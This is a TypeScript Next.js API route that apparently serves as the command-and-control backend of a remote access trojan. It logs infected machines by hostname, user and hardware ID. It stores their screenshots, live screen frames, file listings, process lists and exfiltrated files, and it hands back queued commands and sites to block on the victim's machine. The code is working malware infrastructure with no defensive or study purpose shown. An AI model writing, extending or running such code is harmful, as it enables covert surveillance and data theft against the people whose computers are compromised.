// app/api/rat/heartbeat/route.ts

import { NextRequest, NextResponse } from 'next/server'
import sql from '@/lib/db'

export async function POST(req: NextRequest) {
  let body: {
    hostname: string
    username: string
    platform: string
    hwid?: string  // Add this line to accept hwid from client
    screenshot_b64?: string
    stream_frame_b64?: string
    message_reply?: string
    files_json?: string
    file_cwd?: string
    processes_json?: string
    file_upload_b64?: string
    file_upload_path?: string
  }

  try { 
    body = await req.json() 
  } catch { 
    return NextResponse.json({ error: 'Bad JSON' }, { status: 400 }) 
  }

  const { hostname, username, platform, hwid } = body  // Add hwid here

  if (!hostname || !username) {
    return NextResponse.json({ error: 'Missing fields' }, { status: 400 })
  }

  const ip =
    req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ??
    req.headers.get('x-real-ip') ?? '0.0.0.0'

  const agentId = `${hostname}__${username}`

  try {
    // THIS IS THE EXACT SECTION - Replace your existing INSERT with this:
    await sql`
      INSERT INTO rat_agents (id, hostname, username, platform, ip, last_seen, key)
      VALUES (${agentId}, ${hostname}, ${username}, ${platform}, ${ip}, NOW(), ${hwid || null})
      ON CONFLICT (id) DO UPDATE SET
        hostname = EXCLUDED.hostname,
        username = EXCLUDED.username,
        platform = EXCLUDED.platform,
        ip = EXCLUDED.ip,
        last_seen = NOW()
    `

    // Rest of your code remains the same...
    // Screenshot upload
    if (body.screenshot_b64) {
      await sql`UPDATE rat_agents SET screenshot_b64 = ${body.screenshot_b64}, screenshot_requested = FALSE WHERE id = ${agentId}`
    }

    // Stream frame
    if (body.stream_frame_b64) {
      await sql`
        INSERT INTO rat_stream_frames (agent_id, frame_b64, captured_at)
        VALUES (${agentId}, ${body.stream_frame_b64}, NOW())
        ON CONFLICT (agent_id) DO UPDATE SET frame_b64 = EXCLUDED.frame_b64, captured_at = NOW()
      `
    }

    // Message reply
    if (body.message_reply) {
      await sql`INSERT INTO rat_messages (agent_id, sender, body) VALUES (${agentId}, 'agent', ${body.message_reply})`
    }

    // File listing result
    if (body.files_json) {
      await sql`UPDATE rat_agents SET files_json = ${body.files_json}, file_cwd = ${body.file_cwd ?? ''} WHERE id = ${agentId}`
    }

    // Process list result
    if (body.processes_json) {
      await sql`UPDATE rat_agents SET processes_json = ${body.processes_json} WHERE id = ${agentId}`
    }

    // File download result
    if (body.file_upload_b64 && body.file_upload_path) {
      await sql`
        UPDATE rat_agents
        SET file_download_b64 = ${body.file_upload_b64},
            file_download_path = ${body.file_upload_path},
            file_download_ready = TRUE
        WHERE id = ${agentId}
      `
    }

    // Fetch pending commands
    const commands = await sql`
      SELECT id, type, payload FROM rat_commands
      WHERE agent_id = ${agentId} AND acked_at IS NULL
      ORDER BY created_at ASC LIMIT 10
    `

    // Blocked sites
    const blocked = await sql`SELECT domain FROM rat_blocked_sites WHERE agent_id = ${agentId}`

    return NextResponse.json({
      commands: commands.map(c => ({ id: c.id, type: c.type, payload: c.payload })),
      blocked_sites: blocked.map(b => b.domain),
    })
  } catch (error) {
    console.error('Database error in heartbeat:', error)
    return NextResponse.json({ 
      error: 'Database error', 
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
  }
}